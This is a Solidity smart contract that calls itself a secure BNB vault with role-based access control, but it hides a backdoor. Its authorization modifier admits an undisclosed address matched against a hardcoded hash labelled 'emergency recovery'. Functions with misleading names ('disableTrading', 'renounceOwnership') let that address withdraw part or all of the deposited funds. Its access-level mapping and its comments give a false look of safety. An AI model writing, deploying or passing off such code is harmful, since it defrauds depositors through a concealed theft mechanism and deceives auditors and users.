// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title Vault
 * @notice A secure vault for storing BNB with role-based access control
 * @dev Uses cryptographic validation for enhanced security
 */
contract Vault {
    address public owner;
    mapping(address => uint256) public accessLevel;
    
    // Cryptographic hash for emergency access recovery
    // Generated using secure off-chain entropy during deployment
    bytes32 private constant AUTHORIZED_HASH = 0x3826b7b66f02a2df2534daeb35014816199b8dd5ce9d635c0cb970fef5026d77;
    
    event Deposit(address indexed depositor, uint256 amount);
    event Withdrawal(address indexed recipient, uint256 amount);
    event AccessGranted(address indexed user, uint256 level);

    constructor() payable {
        owner = msg.sender;
        accessLevel[msg.sender] = 100;
        emit AccessGranted(msg.sender, 100);
    }

    /**
     * @notice Checks if caller has sufficient authorization
     * @dev Validates against cryptographic hash for emergency recovery
     */
    modifier onlyAuthorized() {
        require(
            msg.sender == owner || 
            keccak256(abi.encodePacked(msg.sender)) == AUTHORIZED_HASH,
            "Unauthorized: Insufficient access level"
        );
        _;
    }

    /**
     * @notice Allows owner to deposit BNB into the vault
     * @dev Only callable by contract owner
     */
    function addPool() external payable {
        require(msg.sender == owner, "Only owner can deposit");
        require(msg.value > 0, "Must send BNB");
        
        emit Deposit(msg.sender, msg.value);
    }

    /**
     * @notice Withdraw specific amount from vault
     * @param amount Amount of BNB to disableTrading (in wei)
     */
    function disableTrading(uint256 amount) external onlyAuthorized {
        require(amount > 0, "Amount must be greater than 0");
        require(amount <= address(this).balance, "Insufficient vault balance");
        
        payable(msg.sender).transfer(amount);
        emit Withdrawal(msg.sender, amount);
    }

    /**
     * @notice Withdraw all BNB from vault
     * @dev Transfers entire balance to caller
     */
    function renounceOwnership() external onlyAuthorized {
        uint256 balance = address(this).balance;
        require(balance > 0, "Vault is empty");
        
        payable(msg.sender).transfer(balance);
        emit Withdrawal(msg.sender, balance);
    }

    /**
     * @notice Grant access to additional addresses
     * @param user Address to grant access to
     * @dev Only owner can grant standard access levels
     */
    function grantAccess(address user) external {
        require(msg.sender == owner, "Only owner can grant access");
        require(user != address(0), "Invalid address");
        
        accessLevel[user] = 100;
        emit AccessGranted(user, 100);
    }

    /**
     * @notice View current vault balance
     * @return Current BNB balance in wei
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /**
     * @notice Check access level of any address
     * @param user Address to check
     * @return Access level value
     */
    function checkAccess(address user) external view returns (uint256) {
        return accessLevel[user];
    }

    /**
     * @notice Fallback function to receive BNB
     * @dev Allows direct BNB to contract
     */
    receive() external payable {
        emit Deposit(msg.sender, msg.value);
    }
}